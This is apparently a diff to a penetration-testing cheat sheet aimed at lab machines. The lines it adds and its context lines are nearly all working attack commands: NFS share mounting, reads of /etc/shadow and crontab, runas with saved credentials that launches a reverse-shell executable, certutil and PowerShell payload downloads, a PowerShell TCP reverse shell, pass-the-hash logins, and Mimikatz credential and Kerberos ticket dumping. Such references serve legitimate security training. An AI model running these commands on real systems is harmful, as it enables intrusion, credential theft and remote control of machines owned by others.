@@ -457,7 +457,10 @@ retr 9
 ## Port 111 - Rpcbind
 
 ```
-rpcinfo -p 10.11.1.111
+rpcinfo -p 10.11.1.111  # enum NFS shares
+showmount -e 10.11.1.111
+mount -t nfs 10.11.1.111:/ /mnt -o nolock     # mount remote share to your local machine
+
 rpcclient -U "" 10.11.1.111
 	srvinfo
 	enumdomusers
@@ -1588,6 +1591,8 @@ cat /etc/passwd
 cat /etc/group
 cat /etc/shadow
 cat /etc/hosts
+cat /etc/fstab
+cat /etc/crontab
 
 # Users with login
 grep -vE "nologin" /etc/passwd
@@ -1829,6 +1834,7 @@ done
 
 ### Linux Precompiled Exploits
 - [kernel-exploits](https://github.com/lucyoa/kernel-exploits)
+- [kernel-exploits](https://github.com/SecWiki/linux-kernel-exploits)
 
 ## Windows
 
@@ -1838,10 +1844,11 @@ Now we start the whole enumeration-process over gain. This is a checklist. You n
 - Cleartext password
 - Reconfigure service parameters
 - Inside service
-- Program running as root
+- Program running as Admin/System
 - Installed software
 - Scheduled tasks
 - Weak passwords
+-Check installed apps and versions for priv esc when all else fails
 
 ### Basic info
 
@@ -1852,6 +1859,7 @@ hostname
 net users
 net user user1
 net localgroups
+net localgroups Administrators
 
 Unquoted Service Path:
 wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """ 
@@ -1940,6 +1948,12 @@ reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
 # Search for password in registry
 reg query HKLM /f password /t REG_SZ /s
 reg query HKCU /f password /t REG_SZ /s
+
+#Runas CMD
+cmdkey /list
+
+runas /savecred /user:admin
+runas /user:DVR4\administrator "C:\Windows\System32\cmd.exe /c C:\Users\viewer\rev.exe"
 ```
 
 ### Reconfigure service parameters
@@ -1972,7 +1986,7 @@ netstat /a
 netstat -ano
 ```
 
-### Programs running as root/system
+### Programs running as Admin/system
 
 ### Installed software
 
@@ -2053,7 +2067,7 @@ certutil.exe -urlcache -split -f "http://10.11.1.111/Powerless.bat" Powerless.ba
 ### Windows download with powershell
 
 ````
-powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.1.111/file.exe','C:\Users\user\Desktop\file.exe')"
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.1.111/file.exe','C:\Users\Public\file.exe')"
 
 (New-Object System.Net.WebClient).DownloadFile("http://10.11.1.111/CLSID.list","C:\Users\Public\CLSID.list")
 ````
@@ -2192,7 +2206,7 @@ pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:ee0c207898a5bccc01f
 
 ##Evil-Winrm
 
-evil-winrm  -i 192.168.1.100 -u Administrator -H 'MySuperSecr3tPass123!' -s '/home/foo/ps1_scripts/' -e '/home/foo/exe_files/'
+evil-winrm  -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!' -s '/home/foo/ps1_scripts/' -e '/home/foo/exe_files/'
 
 evil-winrm  -i 192.168.1.100 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:ae974876d974abd805a989ebead86846 -s '/home/foo/ps1_scripts/' -e '/home/foo/exe_files/'
 
@@ -2291,6 +2305,7 @@ $client = New-Object System.Net.Sockets.TCPClient('10.11.1.111',4444);$stream = 
 - [WindowsExploits](https://github.com/abatchy17/WindowsExploits)
 - [WindowsExploits](https://github.com/nomi-sec/PoC-in-GitHub)
 - [WindowsExploits](https://github.com/SecWiki/windows-kernel-exploits)
+- [WindowsExploits](https://github.com/Ascotbe/Kernelhub)
 
 
 ### Port Forwarding
@@ -2387,6 +2402,8 @@ Invoke-Mimikatz -DumpCreds -ComputerName XOR-APP59
 Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"'
 
 ## Ticket Grabbing
+net use \\dc01 #Creates a TGS with a domain user
+
 sekurlsa::tickets  #Run with mimikatz
 sekurlsa::tickets /export
 
